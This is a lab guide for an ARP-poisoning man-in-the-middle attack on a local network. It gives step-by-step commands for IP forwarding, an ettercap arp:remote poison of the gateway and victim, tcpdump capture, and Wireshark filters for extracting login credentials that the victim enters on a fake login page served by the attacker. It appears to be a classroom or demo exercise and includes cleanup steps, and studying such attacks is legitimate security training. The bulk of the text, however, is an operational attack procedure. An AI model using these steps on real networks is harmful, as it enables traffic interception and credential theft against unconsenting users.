# ARP Poisoning MITM Lab — Steps

Setup: attacker runs the fake login page (nginx container) + Ettercap. Victim is another machine on the same LAN that "trusts" the page.

## Topology

| Role   | IP            | Notes                          |
|--------|---------------|--------------------------------|
| Attacker | 192.168.1.148 | this machine, runs nginx + ettercap |
| Victim | 192.168.1.110 | target machine                 |
| Gateway | 192.168.1.1   | the router                     |

## 1. Start the fake login page

```bash
docker compose up -d
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080   # expect 200
```

## 2. Preconditions — verify BEFORE attacking

```bash
ping -c 3 192.168.1.110          # must work BEFORE the attack
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.1.148:8080   # page reachable by the victim from its browser
```

The network/AP is fine if ARP resolves (check with `arp -n | grep 192.168.1.110`).

## 3. Enable IP forwarding (mandatory)

Without this, the victim's traffic is absorbed and dropped — the victim loses all network access.

```bash
sudo sysctl -w net.ipv4.ip_forward=1
cat /proc/sys/net/ipv4/ip_forward    # must print 1
```

## 4. Launch the ARP poison

```bash
sudo ettercap -G
```

In the GUI (or CLI `-T -M arp:remote /192.168.1.1// /192.168.1.110//`):

1. Sniff → Unified sniffing → select `wlo1`.
2. Hosts → Scan for hosts → Hosts list → add both the gateway `192.168.1.1` (target 1) and the victim `192.168.1.110` (target 2).
3. MITM → ARP poisoning → check "Sniff remote connections".
4. Start → Start sniffing.

## 5. Verify the MITM (NOT with ping)

Direct `ping 192.168.1.110` from the attacker FAILS during the attack — Ettercap also poisons your own ARP entry for the victim. This is normal.

Instead verify:

- Victim side: run `arp -a` on the victim → the gateway `192.168.1.1` entry should show the attacker's MAC (`4c:23:38:81:ca:a9` on this setup).
- Attacker side: sniff the traffic passing through:

```bash
sudo tcpdump -i wlo1
```

You should see the victim's requests (e.g. DNS, HTTP) flowing through the attacker.

- Have the victim open `http://192.168.1.148:8080` and log in — credentials arrive at the attacker because the victim's traffic to the internet is being relayed via the attacker.

## 6. Wireshark filters for inspecting the capture

Capture on the attacker's interface (wlo1) with Wireshark, then filter:

| Goal | Filter |
|------|--------|
| ARP replies (poisoning packets) | `arp.op == 2` |
| All ARP traffic | `arp` |
| Everything coming from/to the victim (sniffed is flowing through attacker) | `ip.addr == 192.168.1.110` |
| HTTP only, from the victim | `http && ip.addr == 192.168.1.110` |
| Login credentials (the POST to the fake login) | `http.request.method == "POST"` |
| Login credentials + body | `http.request.method == "POST" && urlencoded-form or http contains "username"` |
| DNS queries from the victim (see it resolving things) | `dns && ip.addr == 192.168.1.110` |
| Duplicate gateway IP in ARP (two MACs claiming 192.168.1.1) | `arp && arp.spa == 192.168.1.1` |

Quick CLI equivalent to dump the relevant packets without opening the GUI:

```bash
sudo tcpdump -i wlo1 -nn -vv 'arp or (ip and host 192.168.1.110)' -w mitm.pcap
```

## 7. Cleanup — after the demo

```bash
sudo killall ettercap
sudo sysctl -w net.ipv4.ip_forward=0   # optional: revert
```

ARP caches recover on their own within ~60s. To speed it up, on the victim:

```bash
arp -d 192.168.1.1
```

Confirm normal connectivity is back: `ping -c 3 192.168.1.110`.

## Troubleshooting

| Symptom | Cause / fix |
|---------|-------------|
| Victim loses internet during attack | `ip_forward` is 0 → set it to 1 |
| Ping to victim fails during attack | Expected: attacker's ARP entry for victim is poisoned. Verify via tcpdump/arp on victim instead |
| Can't reach the login page from another device | Run it against `192.168.1.148:8080`, not `localhost`. If even ping/ARP fails → router AP/client isolation is on |
| ARP never resolves while pinging | Different subnet or AP isolation — both machines must be on the same wired/Wi-Fi network without isolation |